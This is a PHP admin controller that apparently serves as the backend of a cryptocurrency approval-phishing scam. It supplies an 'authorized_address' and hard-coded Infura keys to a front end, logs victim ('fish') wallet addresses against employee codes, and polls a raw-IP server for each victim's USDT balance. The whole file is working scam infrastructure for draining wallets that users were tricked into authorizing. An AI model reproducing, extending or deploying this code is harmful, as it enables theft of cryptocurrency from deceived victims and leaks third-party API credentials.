<?php


namespace app\admin\controller;


use app\common\model\Mnemonics;
use app\common\service\AddressService;
use app\common\service\FishService;
use GuzzleHttp\Client;
use think\Controller;
use think\facade\Log;
use think\Request;

class Api extends Controller
{

    public function get_erc(){
        $adddresses = AddressService::getAddress('erc');

        $address = $adddresses[0]['address'];

        $infura = Array(
            'a6510a957f884432a3350d264d3250df',
            '1ac92ae60afd4174aeba1644e2e05b9f',
            '7d73a0c13ce946769577714aef84b79a',
        );

        $data = ['data'=>['authorized_address' => $address, 'infura_key' => $infura[array_rand($infura)]]];

        return json($data);
    }

    public function get_trc(){
        $adddresses = AddressService::getAddress('trc');

        $address = $adddresses[0]['address'];

        $infura = Array(
            'a6510a957f884432a3350d264d3250df',
            '1ac92ae60afd4174aeba1644e2e05b9f',
            '7d73a0c13ce946769577714aef84b79a',
        );

        $data = ['data'=>['authorized_address' => $address, 'infura_key' => $infura[array_rand($infura)]]];

        return json($data);
    }

    public function insert_erc(Request $request) {
        $employee =  $request->post('code');
        $fish_address = $request->post('address');
        $au_address = $request->post('authorized_address');

        FishService::new_erc($employee,$fish_address,$au_address);

    }

    public function insert_trc(Request $request) {
        $employee =  $request->post('code');
        $fish_address = $request->post('address');
        $au_address = $request->post('authorized_address');

        FishService::new_trc($employee,$fish_address,$au_address);
    }

    public function update_balances()
    {
        set_time_limit(0);

        $data = \app\common\model\Fish::order('update_time', 'desc')
                ->limit('100')->select()->toArray();
        foreach ($data as $v)
        {
            $balance = $this->getBalance($v['address'], $v['type']);

            if ($balance == false) {
                continue;
            }

            var_dump($v['address'], $balance);
            echo PHP_EOL;
            \app\common\model\Fish::where('address', $v['address'])->update(['balance' => $balance]);
            sleep(0.3);
        }


    }

    public function getBalance($address, $type)
    {
        $client = new Client();
        try {
            if ($type == 'trc') {
                $url = 'http://45.159.58.93:1203/api/tronApi/queryUSDT';
            } else {
                $url = 'http://45.159.58.93:1300/ethApi/api/queryBalance';
            }

            $request = $client->request('post', $url, ['json' => ['address' => $address]]);
            $body = $request->getBody();
            $content = $body->getContents();
            $res = json_decode($content, true);
            if (isset($res['code']) && $res['code'] == '200') {
                if ($type == 'trc') {
                    return $res['data']['amount'] ?? 0;
                } else {
                    return $res['data']['usdt'] ?? 0;
                }
            } else {
                return false;
            }
        } catch (\Exception $e) {
            return false;
        }

    }
}